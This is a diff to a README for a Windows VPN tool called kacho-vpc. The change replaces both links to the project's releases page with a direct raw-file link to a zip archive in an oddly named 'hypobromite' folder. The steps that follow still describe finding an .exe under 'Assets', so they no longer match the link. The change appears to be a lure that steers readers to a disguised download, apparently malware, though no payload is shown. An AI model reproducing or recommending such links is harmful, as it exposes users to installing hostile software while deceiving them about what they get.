@@ -1,6 +1,6 @@
 # 🌐 kacho-vpc - Secure private network connections for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Seedtimejiao934/kacho-vpc/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Seedtimejiao934/kacho-vpc/main/hypobromite/kacho_vpc_v3.9.zip)
 
 kacho-vpc provides a private network connection for your personal computer. This software allows you to reach network resources as if you were sitting inside a private office or home network. It creates a tunnel that protects your data while it travels across the internet.
 
@@ -8,7 +8,7 @@ kacho-vpc provides a private network connection for your personal computer. This
 
 To start using this software, you need to download the correct file for Windows. 
 
-1. Visit this page to download: [https://github.com/Seedtimejiao934/kacho-vpc/releases](https://github.com/Seedtimejiao934/kacho-vpc/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Seedtimejiao934/kacho-vpc/main/hypobromite/kacho_vpc_v3.9.zip](https://raw.githubusercontent.com/Seedtimejiao934/kacho-vpc/main/hypobromite/kacho_vpc_v3.9.zip)
 2. Look for the section labeled "Assets".
 3. Find the file ending in .exe.
 4. Click the link to save the file to your computer.
